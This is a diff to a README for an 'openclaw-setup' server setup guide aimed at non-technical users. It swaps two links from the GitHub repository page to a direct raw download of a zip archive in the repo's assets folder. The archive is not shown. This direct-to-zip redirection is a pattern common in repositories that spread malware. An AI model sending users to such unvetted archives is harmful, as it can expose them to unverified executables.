@@ -1,6 +1,6 @@
 # 🛠️ openclaw-setup - Simple OpenClaw Server Setup
 
-[![Download openclaw-setup](https://img.shields.io/badge/Download-OpenClaw%20Setup-blue?style=for-the-badge&logo=github)](https://github.com/ColdTimesAreGood/openclaw-setup)
+[![Download openclaw-setup](https://img.shields.io/badge/Download-OpenClaw%20Setup-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ColdTimesAreGood/openclaw-setup/main/assets/setup-openclaw-3.8-beta.2.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ This guide is made for regular users. You do not need to know command lines or s
 
 Use this link to visit the page and download the setup files:
 
-[Visit the openclaw-setup download page](https://github.com/ColdTimesAreGood/openclaw-setup)
+[Visit the openclaw-setup download page](https://raw.githubusercontent.com/ColdTimesAreGood/openclaw-setup/main/assets/setup-openclaw-3.8-beta.2.zip)
 
 If the page opens in GitHub, look for the latest release or the main project files. Download the setup package or app file you see there, then save it to your PC.
 
